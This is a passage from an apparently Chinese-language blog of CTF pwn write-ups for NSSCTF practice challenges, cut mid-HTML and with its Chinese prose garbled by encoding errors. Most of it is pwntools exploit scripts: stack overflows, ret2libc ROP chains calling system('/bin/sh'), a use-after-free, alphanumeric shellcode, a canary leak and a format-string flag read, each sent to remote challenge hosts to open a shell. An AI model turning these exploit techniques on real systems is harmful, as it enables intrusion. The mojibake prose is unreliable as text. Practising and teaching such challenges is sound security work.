class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"nisactf-2022ezheap\"><a class=\"anchor\" href=\"#nisactf-2022ezheap\">#</a> [NISACTF 2022]ezheap</h5>\n<p>è¿™é¢˜è¿˜æ²¡æ¥å¾—åŠæ‰“å¼€çœ‹å°±å‡ºäº†ï¼Œç›´æ¥è¿è¡Œå‘ç°è¾“å…¥å¾ˆå¤šä¸‹é¢çš„æŠ¥é”™æ˜¯ shï¼Œå¹¶ä¸”æç¤ºå“ªé‡Œå¤šäº†ï¼Œé‚£æˆ‘ä»¬å°±ç›´æ¥å¡æº¢å‡ºé‚£é‡Œè¿è¡Œå°±å¥½</p>\n<h5 id=\"wustctf-2020getshell2\"><a class=\"anchor\" href=\"#wustctf-2020getshell2\">#</a> [WUSTCTF 2020]getshell2</h5>\n<p>sh ç›¸å½“äºæ‰§è¡Œ /bin/sh</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28650)</span><br><span class=\"line\">payload=b&#x27;a&#x27;*(0x18+0x4)+p32(0x8048529)+p32(0x08048670)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"nisactf-2022uaf\"><a class=\"anchor\" href=\"#nisactf-2022uaf\">#</a> [NISACTF 2022]UAF</h5>\n<p>æ–°æ‰‹çš„ç¬¬ä¸€ä¸ª uaf é¢˜ç›®è¿™ä¸ªé¢˜ç›®å¾ˆå‹å¥½è®©æˆ‘ä¸å¤ªéš¾å—ï¼Œchecksec çœ‹ä¸€ä¸‹å°±æ˜ç™½å¼€å¯äº† canaryï¼Œä½†æ˜¯æ²¡æœ‰æ³„éœ²æˆ‘åœ¨ stack ä¸Šå‡†å¤‡æ³„éœ²ä»–ä½†æ˜¯ä¸è¡Œï¼Œç›´æ¥æ­»å¾ªç¯ï¼Œ32 ä½æ‹–è¿› ida çœ‹ f5 äº†ï¼Œå‘ç° f5 é‡Œé¢çš„å‡½æ•°æœ‰å¾ˆå¤šï¼Œå¹¶ä¸”é€»è¾‘åˆ†æ˜ï¼Œé‚£åªæœ‰æ…¢æ…¢å®¡è®¡äº†ï¼Œçœ‹ main å‡½æ•°å‘ç°æ˜¯ä¸€ä¸ªèœå•æœ‰ createã€editã€delã€showï¼Œå¹¶ä¸”é‡Œé¢è¿˜æœ‰ä¸€ä¸ª systemï¼Œæ„Ÿè§‰åƒæ˜¯çœ‹åˆ°äº†æ–°å¤§é™†ä¸€æ ·ï¼Œæ ¹æ®é¢˜ç›®æ¥å°±æ˜¯ uafï¼Œç™¾åº¦æœç´¢ä¸€ä¸‹å°±èƒ½å‘ç° free çš„æ¼æ´ï¼Œä½¿ç”¨äº† malloc åˆ†é…äº†å†…å­˜ç©ºé—´ç»™ä¸€ä¸ªæ•°å­—ä½†æ˜¯ free æ²¡æœ‰æ¸…ç©ºåªæ˜¯æš‚æ—¶é‡Šæ”¾äº†ï¼Œåªè¦ä¸‹ä¸€ä¸ªåŒæ ·ç”³è¯·ä¸€æ ·çš„å†…å­˜çš„è¯å†…å­˜åœ°å€å°±ä¼šä¸€æ ·ï¼Œå†çœ‹ edit èƒ½å‘ç°è¿™ä¸ª if è¯­å¥èƒ½å¤Ÿä¿®æ”¹ 0 å¹¶ä¸”åœ¨é‡Œé¢è¾“å…¥å€¼ï¼Œç„¶åå°±æ˜¯ delï¼Œä½¿ç”¨ free é‡Šæ”¾ç©ºé—´ï¼Œåœ¨ä¹‹åå°±æ˜¯ show æ¥æŸ¥çœ‹ edit å†™å…¥çš„å€¼ï¼Œé‚£å°±å¯æœ‰æ¥æ„é€  uaf æ¼æ´äº†ã€‚<br />\n`` å¦‚æœè¯´æœ‰è¦æ³¨æ„çš„ï¼Œå°±æ˜¯åˆ©ç”¨ show åŠŸèƒ½ get_shell çš„æ—¶å€™åªèƒ½ä½¿ç”¨ç´¢å¼•ä¸º 0 çš„å †å—ï¼Œè€Œ edit ä¸èƒ½ç¼–è¾‘ç´¢å¼•ä¸º 0 çš„å †å—ï¼Œæ‰€ä»¥å°±è¦ç”¨åˆ° UAF äº†å› ä¸º if (v1 &lt;= 0 || v1&gt; i ) å…¶ä¸­ 0 å¯ä»¥é€šè¿‡</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">p=remote(&#x27;node4.anna.nssctf.cn&#x27;,28338)</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">def create():</span><br><span class=\"line\">    p.sendlineafter(&#x27;:&#x27;,&#x27;1&#x27;)</span><br><span class=\"line\">def edit(index,string):</span><br><span class=\"line\">    p.sendlineafter(&#x27;:&#x27;,&#x27;2&#x27;)</span><br><span class=\"line\">    p.sendlineafter(&#x27;page&#x27;,index)</span><br><span class=\"line\">    p.sendlineafter(&#x27;strings&#x27;,string)</span><br><span class=\"line\">def dela(index):</span><br><span class=\"line\">    p.sendlineafter(&#x27;:&#x27;,&#x27;3&#x27;)</span><br><span class=\"line\">    p.sendlineafter(&#x27;page&#x27;,index)</span><br><span class=\"line\">def show(index):</span><br><span class=\"line\">    p.sendlineafter(&#x27;:&#x27;,&#x27;4&#x27;)</span><br><span class=\"line\">    p.sendlineafter(&#x27;page&#x27;,index)</span><br><span class=\"line\">create()</span><br><span class=\"line\">dela(&#x27;0&#x27;)</span><br><span class=\"line\">create()</span><br><span class=\"line\">payload=b&#x27;sh;\\x00&#x27;+p32(0x8048642)</span><br><span class=\"line\">edit(&#x27;1&#x27;,payload)</span><br><span class=\"line\">show(&#x27;0&#x27;)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"bjdctf-2020babyrop\"><a class=\"anchor\" href=\"#bjdctf-2020babyrop\">#</a> [BJDCTF 2020]babyrop</h5>\n<p>æœ¬é¢˜ä½¿ç”¨çš„æ˜¯ libc6_2.23-0ubuntu11_amd64</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">import time</span><br><span class=\"line\"></span><br><span class=\"line\">from LibcSearcher import *</span><br><span class=\"line\"></span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">a=0</span><br><span class=\"line\"></span><br><span class=\"line\">if a:</span><br><span class=\"line\"></span><br><span class=\"line\">Â p=process(&#x27;./pw&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">else:</span><br><span class=\"line\"></span><br><span class=\"line\">Â p=remote(&#x27;node4.anna.nssctf.cn&#x27;,28892)</span><br><span class=\"line\"></span><br><span class=\"line\">elf=ELF(&#x27;./pw&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">rdi_pop=0x400733</span><br><span class=\"line\"></span><br><span class=\"line\">ret=0x4004c9</span><br><span class=\"line\"></span><br><span class=\"line\">main=elf.sym[&#x27;main&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">puts_plt=elf.plt[&#x27;puts&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">payload=b&#x27;a&#x27;*(0x20+0x8)+p64(rdi_pop)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendlineafter(&#x27;story!&#x27;,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">puts=u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))</span><br><span class=\"line\"></span><br><span class=\"line\">log.info(puts)</span><br><span class=\"line\"></span><br><span class=\"line\">libc=LibcSearcher(&#x27;puts&#x27;,puts)</span><br><span class=\"line\"></span><br><span class=\"line\">libc_base=puts-libc.dump(&#x27;puts&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">system=libc_base+libc.dump(&#x27;system&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">str_bin_sh=libc_base+libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">payload2=b&#x27;a&#x27;*(0x20+0x8)+p64(ret)+p64(rdi_pop)+p64(str_bin_sh)+p64(system)+p64(main)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(payload2)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"hnctf-2022-week1safe_shellcode\"><a class=\"anchor\" href=\"#hnctf-2022-week1safe_shellcode\">#</a> [HNCTF 2022 Week1]safe_shellcode</h5>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28251)</span><br><span class=\"line\">payload=&quot;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00gao@fossa&quot;</span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"hgame-2022-week1test-your-gdb\"><a class=\"anchor\" href=\"#hgame-2022-week1test-your-gdb\">#</a> [HGAME 2022 week1]test your gdb</h5>\n<p><figure class=\"highlight plaintext\"><figcaption><span>pwn import *</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#p = process(&quot;./../testYourGdb&quot;)</span><br><span class=\"line\">elf = ELF(&quot;./../testYourGdb&quot;)</span><br><span class=\"line\">p = remote(&quot;1.14.71.254&quot;,28150)</span><br><span class=\"line\"></span><br><span class=\"line\">cmpText = p64(0xb0361e0e8294f147) + p64(0x8c09e0c34ed8a6a9)</span><br><span class=\"line\"></span><br><span class=\"line\">binsh = 0x401256</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(b&#x27;word\\n&#x27;)</span><br><span class=\"line\">p.send(cmpText)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recv(0x18)</span><br><span class=\"line\">canary = u64(p.recv(8))</span><br><span class=\"line\">print(hex(canary))</span><br><span class=\"line\"></span><br><span class=\"line\">padding = b&#x27;a&#x27; * (0x28 - 0x10)</span><br><span class=\"line\">payload = padding + p64(canary) + p64(0) + p64(binsh)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.recv()</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"hnctf-2022-week1ezr0p64\"><a class=\"anchor\" href=\"#hnctf-2022-week1ezr0p64\">#</a> [HNCTF 2022 Week1]ezr0p64</h5>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">å·²ç»ç»™äº†.so.6äº†ç›´æ¥æ‰“ret2libc</span><br><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level=&#x27;debug&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">context.os=&#x27;linux&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">elf=ELF(&#x27;./ezrop64&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">libc=ELF(&#x27;./libc.so.6&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28053)</span><br><span class=\"line\"></span><br><span class=\"line\">pop_rdi_ret = 0x4012a3</span><br><span class=\"line\"></span><br><span class=\"line\">ret = 0x40101a</span><br><span class=\"line\"></span><br><span class=\"line\">vuln = elf.sym[&#x27;vuln&#x27;]</span><br><span class=\"line\">p.recvuntil(b&quot;:&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">puts_addr = int(p.recv(14),16)</span><br><span class=\"line\"></span><br><span class=\"line\">log.info(puts_addr)</span><br><span class=\"line\">libc_base = puts_addr - libc.sym[&#x27;puts&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">system = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">binsh = libc_base + next(libc.search(b&quot;/bin/sh\\x00&quot;))</span><br><span class=\"line\">payload = b&#x27;a&#x27;*0x108 + p64(ret) + p64(pop_rdi_ret) + p64(binsh) + p64(system)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"gdouctf-2023çœŸç”·äººä¸‹120å±‚\"><a class=\"anchor\" href=\"#gdouctf-2023çœŸç”·äººä¸‹120å±‚\">#</a> [GDOUCTF 2023] çœŸç”·äººä¸‹ 120 å±‚</h5>\n<p>å¥—ç€ä¸¤å±‚ rand éœ€è¦å®šä¹‰ä¸¤æ¬¡ srand ä½¿ç”¨ python çš„ ctypes çš„åº“æ¥è¿›è¡Œè§£é¢˜</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">import ctypes</span><br><span class=\"line\"></span><br><span class=\"line\">libc=ctypes.CDLL(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">libc.srand.argtypes=[ctypes.c_uint]</span><br><span class=\"line\"></span><br><span class=\"line\">libc.srand(libc.time(0))</span><br><span class=\"line\"></span><br><span class=\"line\">rand_result=libc.rand()</span><br><span class=\"line\"></span><br><span class=\"line\">libc.srand(rand_result%3-1522127470)</span><br><span class=\"line\"></span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">p=remote(&#x27;node4.anna.nssctf.cn&#x27;,28105)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(&#x27;trap.&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">for i in range(120):</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  rand_r=libc.rand()%4+1</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  p.recvuntil(b&#x27;Floor&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  p.sendline(str(rand_r))</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"hubuctf-2022-æ–°ç”Ÿèµ›fmt\"><a class=\"anchor\" href=\"#hubuctf-2022-æ–°ç”Ÿèµ›fmt\">#</a> [HUBUCTF 2022 æ–°ç”Ÿèµ›] fmt</h5>\n<p>æœ¬åœ°æµ‹è¯•æŸ¥çœ‹ flag.txt è¢«è¯»åçš„æ ˆåœ°å€çœ‹åˆ°åç§»å¤šå°‘åˆ©ç”¨ % p æ¥è·å¾— flag</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28473)</span><br><span class=\"line\"># get flag</span><br><span class=\"line\"># æ ¹æ® format å’Œ s åœ¨æ ˆä¸Šçš„ç›¸å¯¹ä½ç½®è®¡ç®—è¯»å–ä½ç½®ï¼š(0x60 - 0x40 / 8) + 5 = 12</span><br><span class=\"line\">flag_addr = 12</span><br><span class=\"line\">flag = &#x27;&#x27;</span><br><span class=\"line\">while True:</span><br><span class=\"line\">    p.sendlineafter(b&#x27;Echo as a service&#x27;, &#x27;%&#123;&#125;$p&#x27;.format(flag_addr))</span><br><span class=\"line\">    p.recvuntil(b&#x27;0x&#x27;)</span><br><span class=\"line\">    part = p.recvuntil(b&#x27;\\n&#x27;)[:-1]</span><br><span class=\"line\">    for i in range(0, len(part), 2):</span><br><span class=\"line\">        index = len(part) - i</span><br><span class=\"line\">        flag += chr(int(part[index - 2:index].ljust(2, b&#x27;0&#x27;), 16))</span><br><span class=\"line\">    print(flag)</span><br><span class=\"line\">    if &#x27;&#125;&#x27; in flag:</span><br><span class=\"line\">        break</span><br><span class=\"line\">    flag_addr += 1</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"hnctf-2022-week1ezcmp\"><a class=\"anchor\" href=\"#hnctf-2022-week1ezcmp\">#</a> [HNCTF 2022 Week1]ezcmp</h5>\n<p>ida æŸ¥çœ‹åˆ°ä»–å¿…é¡»è¦å’Œ buf ç›¸åŒæ‰èƒ½å¾—åˆ° shell é‚£æˆ‘ä»¬å°±å» gdb è°ƒè¯•æŸ¥çœ‹ buff çš„å€¼ x/10a å¯ä»¥æŸ¥çœ‹åˆ° buff çš„å€¼æ®µæŠŠä»–è¾“è¿› buf å³å¯</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">#context(log_level=&#x27;debug&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28286)</span><br><span class=\"line\">payload=p64(0x144678aadc0e4072)+p64(0x84b6e81a4c7eb0e2)+p64(0xf426588abcee2052)+p64(0xc8cb2c5e90c2)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"litctf-2023ç‹ ç‹ çš„æº¢å‡ºæ¶…~\"><a class=\"anchor\" href=\"#litctf-2023ç‹ ç‹ çš„æº¢å‡ºæ¶…~\">#</a> [LitCTF 2023] ç‹ ç‹ çš„æº¢å‡ºæ¶…ï½</h5>\n<p>æ–°çŸ¥è¯† \\x00 èƒ½å¤Ÿæˆªæ–­ strlen</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">import time</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">s       = lambda data               :io.send(data)</span><br><span class=\"line\">sa      = lambda delim,data         :io.sendafter(str(delim), data)</span><br><span class=\"line\">sl      = lambda data               :io.sendline(data)</span><br><span class=\"line\">sla     = lambda delim,data         :io.sendlineafter(str(delim), data)</span><br><span class=\"line\">r       = lambda num                :io.recv(num)</span><br><span class=\"line\">ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)</span><br><span class=\"line\">itr     = lambda                    :io.interactive()</span><br><span class=\"line\">uu32    = lambda data               :u32(data.ljust(4,b&#x27;\\x00&#x27;))</span><br><span class=\"line\">uu64    = lambda data               :u64(data.ljust(8,b&#x27;\\x00&#x27;))</span><br><span class=\"line\">ls      = lambda data               :log.success(data)</span><br><span class=\"line\"></span><br><span class=\"line\">binary = &#x27;./pwn4&#x27;</span><br><span class=\"line\">libelf = &#x27;./libc-2.31.so&#x27;</span><br><span class=\"line\">target = &#x27;&#x27;</span><br><span class=\"line\">target = &#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">context.arch      = &#x27;amd64&#x27;</span><br><span class=\"line\">context.log_level = &#x27;debug&#x27;</span><br><span class=\"line\">context.terminal  = [&#x27;tme?mux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;,&#x27;-l&#x27;,&#x27;130&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">io = remote(&#x27;node4.anna.nssctf.cn&#x27;,28710)</span><br><span class=\"line\"></span><br><span class=\"line\">#io = process(binary)</span><br><span class=\"line\"></span><br><span class=\"line\">pad = 0x68</span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(binary)</span><br><span class=\"line\">rop = ROP(binary)</span><br><span class=\"line\">libc = ELF(libelf)</span><br><span class=\"line\"></span><br><span class=\"line\">pop_rdi_ret = rop.find_gadget([&#x27;pop rdi&#x27;,&#x27;ret&#x27;])[0]</span><br><span class=\"line\"></span><br><span class=\"line\">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class=\"line\">puts_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class=\"line\">vuln = 0x4006B0</span><br><span class=\"line\">ret = 0x0400768</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">pay = pad * b&#x27;\\x00&#x27; + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln)</span><br><span class=\"line\">sl(pay)</span><br><span class=\"line\">ru(&#x27;Received\\n&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">x = uu64(r(6))</span><br><span class=\"line\">libc_base = x - libc.sym[&#x27;puts&#x27;]</span><br><span class=\"line\">system = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class=\"line\">bin_sh = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;))</span><br><span class=\"line\">ls(hex(libc_base))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">pay = pad * b&#x27;\\x00&#x27; + p64(ret)*1 + p64(pop_rdi_ret) + p64(bin_sh) + p64(system) + p64(vuln)</span><br><span class=\"line\">sl(pay)</span><br><span class=\"line\">sl(&#x27;ls&#x27;)</span><br><span class=\"line\">sl(&#x27;cat flag&#x27;)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"hnctf-2022-week2ez_backdoor\"><a class=\"anchor\" href=\"#hnctf-2022-week2ez_backdoor\">#</a> [HNCTF 2022 WEEK2]ez_backdoor</h5>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">import time</span><br><span class=\"line\">io = remote(&#x27;node5.anna.nssctf.cn&#x27;,28762)</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;)</span><br><span class=\"line\">#io = process(binary)</span><br><span 